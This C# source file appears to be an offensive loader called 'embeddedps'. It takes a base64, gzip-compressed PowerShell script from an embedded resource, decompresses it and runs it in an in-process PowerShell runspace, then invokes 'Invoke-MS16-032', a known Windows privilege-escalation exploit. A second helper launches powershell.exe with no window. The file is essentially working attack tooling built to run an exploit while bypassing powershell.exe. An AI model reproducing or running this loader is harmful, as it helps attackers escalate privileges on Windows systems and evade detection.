using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Reflection;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;

namespace embeddedps
{
    class Program
    {
        static void Main(string[] args)
        {
            string output = getps();
            //output = runps(output, "powershell.exe");
            ExecuteSynchronously(output);
           Console.WriteLine("Finished!");
            Console.ReadLine();
        }

        static string getps()
        {
            string result = "";
            var assembly = Assembly.GetExecutingAssembly();
            //var resourceName = Properties.Resources.ms16032;
            result = Properties.Resources.iv16032;
            //result = "ping -t 5 127.0.0.1";
            //var bytes = Encoding.UTF8.GetBytes(result);
            //var base64 = Convert.ToBase64String(bytes);
            //return base64.ToString();
            //using (Stream stream = assembly.GetManifestResourceStream(resourceName))
            //using (StreamReader reader = new StreamReader(stream))
            //{
            //    result = reader.ReadToEnd();
            // }
             return result;
        }

        static public void ExecuteSynchronously(string input)
        {
 /*
$ms = New-Object System.IO.MemoryStream
$ms.Write($data, 0, $data.Length)
$ms.Seek(0,0) | Out-Null

$cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
$sr = New-Object System.IO.StreamReader($cs)
$t = $sr.readtoend()

            */
            var base64EncodedBytes = System.Convert.FromBase64String(input);
            Console.WriteLine(input.Length);
            System.IO.MemoryStream ms = new System.IO.MemoryStream();
            ms.Write(base64EncodedBytes, 0, base64EncodedBytes.Length);
            ms.Seek(0, 0);

            System.IO.Compression.GZipStream cs = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Decompress);
            System.IO.StreamReader sr = new StreamReader(cs);
            var t = sr.ReadToEnd();

            //string pscode= System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
            InitialSessionState iss = InitialSessionState.CreateDefault();
            Runspace rs = RunspaceFactory.CreateRunspace(iss);
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            //ps.AddScript(pscode);
            ps.AddScript(t);
            ps.AddScript("Invoke-MS16-032");
            ps.AddCommand("Out-Default");
            ps.Invoke();
            rs.Close();
        }

        static string runps(string input, string ps)
        {
            System.Diagnostics.Process p1 = new System.Diagnostics.Process();

            p1.StartInfo.CreateNoWindow = true;
            p1.StartInfo.FileName = ps;
            p1.StartInfo.Arguments = input;
            p1.StartInfo.RedirectStandardOutput = true;
            p1.StartInfo.RedirectStandardError = true;
            p1.StartInfo.UseShellExecute = false;

            p1.Start();

            p1.WaitForExit();

            string err = p1.StandardError.ReadToEnd();
            string result = p1.StandardOutput.ReadToEnd();

            if (String.IsNullOrEmpty(err))
            {
                return result;
            }
            else
            {
                return err;
            }


        }
    }
}
